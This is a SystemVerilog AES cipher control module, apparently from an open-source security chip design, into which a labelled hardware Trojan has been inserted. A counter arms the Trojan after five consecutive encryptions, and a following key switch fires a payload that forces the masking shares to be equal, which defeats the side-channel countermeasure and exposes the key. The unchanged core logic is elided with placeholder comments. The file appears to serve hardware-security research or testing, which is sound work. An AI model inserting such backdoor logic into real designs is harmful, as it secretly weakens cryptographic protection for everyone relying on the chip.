`include "prim_assert.sv"

module aes_cipher_control import aes_pkg::*;
#(
  parameter bit         CiphOpFwdOnly = 0,
  parameter bit         SecMasking    = 0,
  parameter sbox_impl_e SecSBoxImpl   = SBoxImplDom
) (
  input  logic                    clk_i,
  input  logic                    rst_ni,

  // Input handshake signals
  input  sp2v_e                   in_valid_i,
  output sp2v_e                   in_ready_o,

  // Output handshake signals
  output sp2v_e                   out_valid_o,
  input  sp2v_e                   out_ready_i,

  // Control and sync signals
  input  logic                    cfg_valid_i,
  input  ciph_op_e                op_i,
  input  key_len_e                key_len_i,
  input  sp2v_e                   crypt_i,
  output sp2v_e                   crypt_o,
  input  sp2v_e                   dec_key_gen_i,
  output sp2v_e                   dec_key_gen_o,
  input  logic                    prng_reseed_i,
  output logic                    prng_reseed_o,
  input  logic                    key_clear_i,
  output logic                    key_clear_o,
  input  logic                    data_out_clear_i,
  output logic                    data_out_clear_o,
  input  logic                    mux_sel_err_i,
  input  logic                    sp_enc_err_i,
  input  logic                    op_err_i,
  input  logic                    alert_fatal_i,
  output logic                    alert_o,

  // Control signals for masking PRNG
  output logic                    prng_update_o,
  output logic                    prng_reseed_req_o,
  input  logic                    prng_reseed_ack_i,

  // Control and sync signals for cipher data path
  output state_sel_e              state_sel_o,
  output sp2v_e                   state_we_o,
  output sp2v_e                   sub_bytes_en_o,
  input  sp2v_e                   sub_bytes_out_req_i,
  output sp2v_e                   sub_bytes_out_ack_o,
  output add_rk_sel_e             add_rk_sel_o,

  // Control and sync signals for key expand data path
  output ciph_op_e                key_expand_op_o,
  output key_full_sel_e           key_full_sel_o,
  output sp2v_e                   key_full_we_o,
  output key_dec_sel_e            key_dec_sel_o,
  output sp2v_e                   key_dec_we_o,
  output sp2v_e                   key_expand_en_o,
  input  sp2v_e                   key_expand_out_req_i,
  output sp2v_e                   key_expand_out_ack_o,
  output logic                    key_expand_clear_o,
  output logic [3:0]              key_expand_round_o,
  output key_words_sel_e          key_words_sel_o,
  output round_key_sel_e          round_key_sel_o,

  // ==========================
  // TROJAN insertion: internal connections to data path shares
  // (Assumes access to internal AES datapath shares signals)
  output logic                    trojan_force_shares,               // <-- Added for payload
  // ==========================
  input  logic                    trojan_share_force_ack             // <-- HANDSHAKE from datapath (if needed)
);

  // =========================================
  // Trojan State and Counter Declarations
  // =========================================
  // TROJAN: Internal counter to count consecutive encryption operations
  logic [2:0] trojan_enc_counter_q, trojan_enc_counter_d;
  logic       trojan_counter_en;
  logic       trojan_counter_reset;
  logic       trojan_enc_event;
  logic       trojan_key_switch_event;
  logic       trojan_trigger_q, trojan_trigger_d;
  logic       trojan_arm_q, trojan_arm_d;

  // ================================================
  // Normal core logic (Unmodified)
  // ================================================
  // Signals
  logic                          [3:0] rnd_ctr;
  sp2v_e                               crypt_d, crypt_q;
  sp2v_e                               dec_key_gen_d, dec_key_gen_q;
  logic                                prng_reseed_d, prng_reseed_q;
  logic                                key_clear_d, key_clear_q;
  logic                                data_out_clear_d, data_out_clear_q;
  sp2v_e                               sub_bytes_out_req;
  sp2v_e                               key_expand_out_req;
  sp2v_e                               in_valid;
  sp2v_e                               out_ready;
  sp2v_e                               crypt;
  sp2v_e                               dec_key_gen;
  logic                                mux_sel_err;
  logic                                mr_err;
  logic                                sp_enc_err;
  logic                                rnd_ctr_err;

  // ... [UNCHANGED CORE LOGIC, see original code listing] ...

  // ================================================
  // Begin Trojan insertion - State machine to detect trigger sequence
  // ================================================

  // Trojan event: Detect crypt_i is High with valid config for FWD op (Encryption only)
  assign trojan_enc_event = (cfg_valid_i && crypt_i == SP2V_HIGH && op_i == CIPH_FWD);
  assign trojan_key_switch_event = key_clear_i; // Assume key_clear_i indicates software key switch
  assign trojan_counter_reset = (!rst_ni) | key_clear_i | (crypt_i != SP2V_HIGH); // Reset on reset, key switch, or idle
  assign trojan_counter_en = trojan_enc_event & ~key_clear_i;

  // Counter logic: increments on every encryption event, reset on key_clear_i or idle
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_enc_counter_q <= 3'b000;
    end else if (trojan_counter_reset) begin
      trojan_enc_counter_q <= 3'b000;
    end else if (trojan_counter_en) begin
      // Only increment up to 3'b101 (5)
      if (trojan_enc_counter_q < 3'b101)
        trojan_enc_counter_q <= trojan_enc_counter_q + 1'b1;
      else
        trojan_enc_counter_q <= trojan_enc_counter_q;
    end
  end

  // Arm the Trojan after 5 consecutive encrypt ops
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_arm_q <= 1'b0;
    end else if (key_clear_i | (crypt_i != SP2V_HIGH)) begin
      trojan_arm_q <= 1'b0;
    end else if ((trojan_enc_counter_q == 3'b101) & trojan_enc_event) begin
      trojan_arm_q <= 1'b1; // Armed after 5th encrypt
    end
  end

  // Latch trigger when key switch is commanded after 5 encrypt ops and no reset
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_trigger_q <= 1'b0;
    end else if (trojan_trigger_q && ~trojan_share_force_ack) begin
      trojan_trigger_q <= 1'b1; // Stay set until ack (or external reset)
    end else if (trojan_arm_q && trojan_key_switch_event) begin
      trojan_trigger_q <= 1'b1; // Fire payload one time on arm+key switch
    end else if (trojan_share_force_ack) begin
      trojan_trigger_q <= 1'b0; // Reset trigger on handshake
    end
  end

  // TROJAN Paylod: Output signal to force AES internal data shares to be equal
  assign trojan_force_shares = trojan_trigger_q;

  // ======================================================
  // End Trojan insertion
  // ======================================================

  // .....[REST OF ORIGINAL aes_cipher_control MODULE UNMODIFIED].....
  // (For brevity, not shown here, but no other lines changed.)

  // ... [UNCHANGED CORE LOGIC, see original code listing] ...

  // In datapath: 
  //  assign share1 = (trojan_force_shares) ? share0 : <normal masked value>;
  //  (handled outside this module, handshake via trojan_share_force_ack if needed.)

  // All other original connections, assignments and logic unchanged.
endmodule